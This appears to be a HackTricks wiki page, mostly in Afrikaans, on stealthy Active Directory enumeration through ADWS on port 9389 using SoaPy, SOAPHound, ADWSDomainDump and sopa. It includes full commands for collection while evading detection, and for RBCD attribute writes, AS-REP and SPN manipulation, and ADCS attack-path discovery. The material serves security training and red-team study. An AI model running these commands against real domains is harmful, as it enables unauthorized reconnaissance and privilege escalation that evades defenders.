# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Wat is ADWS?

Active Directory Web Services (ADWS) is **per verstek op elke Domain Controller aangeskakel sedert Windows Server 2008 R2** en luister op TCP **9389**. Ondanks die naam is **geen HTTP betrokke** nie. In plaas daarvan gee die diens LDAP-styl data bloot deur 'n stapel eienaardige .NET framing-protokolle:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Omdat die verkeer ingekapsuleer is binne hierdie binaire SOAP-raamwerke en oor 'n ongewone poort reis, is **enumeration through ADWS far less likely to be inspected, filtered or signatured than classic LDAP/389 & 636 traffic**. Vir operateurs beteken dit:

* Stealthier recon – Blue teams often concentrate on LDAP queries.
* Vryheid om van **non-Windows hosts (Linux, macOS)** te versamel deur 9389/TCP deur 'n SOCKS-proxy te tunnelleer.
* Dieselfde data wat jy via LDAP sou verkry (gebruikers, groepe, ACLs, schema, ens.) en die vermoë om **writes** uit te voer (bv. `msDs-AllowedToActOnBehalfOfOtherIdentity` vir **RBCD**).

ADWS-interaksies word geïmplementeer oor WS-Enumeration: elke query begin met 'n `Enumerate` boodskap wat die LDAP filter/attributes definieer en 'n `EnumerationContext` GUID teruggee, gevolg deur een of meer `Pull` boodskappe wat tot by die server-gedefinieerde resultaatsvenster stroom. Contexts verval na ~30 minute, so tooling óf moet resultate pagineer óf filters split (prefix queries per CN) om staatverlies te vermy. Wanneer jy vir security descriptors vra, spesifiseer die `LDAP_SERVER_SD_FLAGS_OID` control om SACLs uit te sluit, anders gooi ADWS eenvoudig die `nTSecurityDescriptor` attribuut uit sy SOAP-antwoord.

> NOTE: ADWS word ook deur baie RSAT GUI/PowerShell tools gebruik, so verkeer kan met legitieme admin-aktiwiteit meng.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) is 'n **volledige herimplementering van die ADWS-protokolstapel in suiwer Python**. Dit bou die NBFX/NBFSE/NNS/NMF-raamwerke byte-vir-byte en maak versameling van Unix-agtige stelsels moontlik sonder om die .NET-runtime te raak.

### Key Features

* Supports **proxying through SOCKS** (useful from C2 implants).
* Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** for direct ingestion into BloodHound.
* `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.

### Targeted collection flags & write operations

SoaPy word saamgestuur met gekuratede switches wat die mees algemene LDAP hunting-take oor ADWS repliseer: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` knobs vir custom pulls. Koppel dit aan write primitives soos `--rbcd <source>` (stel `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging for targeted Kerberoasting) en `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Voorbeeld van 'n geteikende SPN hunt wat slegs `samAccountName` en `servicePrincipalName` teruggee:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Gebruik dieselfde host/credentials om bevindinge onmiddellik te weaponiseer: dump RBCD-capable objects met `--rbcds`, en pas dan `--rbcd 'WEBSRV01$' --account 'FILE01$'` toe om 'n Resource-Based Constrained Delegation chain te stig (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) vir die volledige misbruikpad).

### Installasie (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump oor ADWS (Linux/Windows)

* Fork van `ldapdomaindump` wat LDAP queries ruil vir ADWS calls op TCP/9389 om LDAP-signature hits te verminder.
* Voer 'n aanvanklike bereikbaarheidstoets na 9389 uit tensy `--force` gespesifiseer is (sla die probe oor as port scans noisy/filtered).
* Getoets teen Microsoft Defender for Endpoint en CrowdStrike Falcon met 'n suksesvolle bypass in die README.

### Installasie
```bash
pipx install .
```
### Gebruik
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipiese uitset registreer die 9389-toeganklikheidskontrole, ADWS bind, en dump begin/einde:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - 'n praktiese kliënt vir ADWS in Golang

Soos soapy, [sopa](https://github.com/Macmod/sopa) implementeer die ADWS-protokoolstack (MS-NNS + MC-NMF + SOAP) in Golang en stel opdragreëlvlae beskikbaar om ADWS-oproepe uit te voer soos:

* **Objeksoektog en -ophaling** - `query` / `get`
* **Objeklewensiklus** - `create [user|computer|group|ou|container|custom]` en `delete`
* **Attribuutsredigering** - `attr [add|replace|delete]`
* **Rekeningbestuur** - `set-password` / `change-password`
* en ander soos `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Hoë-volume ADWS-versameling (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is 'n .NET-versamelaar wat alle LDAP-interaksies binne ADWS hou en BloodHound v4-kompatibele JSON uitstuur. Dit bou een keer 'n volledige kas van `objectSid`, `objectGUID`, `distinguishedName` en `objectClass` op (`--buildcache`), en hergebruik dit dan vir hoë-volume `--bhdump`, `--certdump` (ADCS) of `--dnsdump` (AD-geïntegreerde DNS) draaie sodat slegs ~35 kritieke attribuutte ooit die DC verlaat. AutoSplit (`--autosplit --threshold <N>`) deel navrae outomaties volgens CN-voorvoegsel om onder die 30-minuut EnumerationContext-timeout in groot foreste te bly.

Tipiese werkvloei op 'n domein-gekoppelde operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Uitgevoerde JSON-slotte direk in SharpHound/BloodHound-werkvloei geplaas — sien [BloodHound methodology](bloodhound.md) vir idees oor opvolgende grafieke. AutoSplit maak SOAPHound veerkragtig op woude met miljoene objekte terwyl dit die aantal navrae laer hou as ADExplorer-styl snapshots.

## Stealth AD-versamelingswerkvloei

Die volgende werkvloei wys hoe om te **enumereer** **domein- & ADCS-objekte** oor ADWS, dit na BloodHound JSON om te skakel en te soek na sertifikaat-gebaseerde aanvalspaaie — alles vanaf Linux:

1. **Tunnel 9389/TCP** vanaf die teiken-netwerk na jou masjien (bv. via Chisel, Meterpreter, SSH dynamic port-forward, ens.). Stel die omgewingsveranderlike: `export HTTPS_PROXY=socks5://127.0.0.1:1080` of gebruik SoaPy’s `--proxyHost/--proxyPort`.

2. **Versamel die wortel-domein-objek:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Versamel ADCS-verwante objekte uit die Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Skakel na BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Laai die ZIP op** in die BloodHound GUI en voer cypher queries soos `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` uit om sertifikaat-eskalasiepaaie (ESC1, ESC8, ens.) te openbaar.

### Skryf `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombineer dit met `s4u2proxy`/`Rubeus /getticket` vir ’n volle **Resource-Based Constrained Delegation** ketting (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Opsomming van Gereedskap

| Doel | Tool | Aantekeninge |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lees/skryf |
| Hoë-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modusse |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Skakel SoaPy/ldapsearch logs om |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Kan deur dieselfde SOCKS geproksieer word |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generiese kliënt om met bekende ADWS-endpunte te koppel - laat toe vir enumeration, object creation, attribute modifications, and password changes |

## Verwysings

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
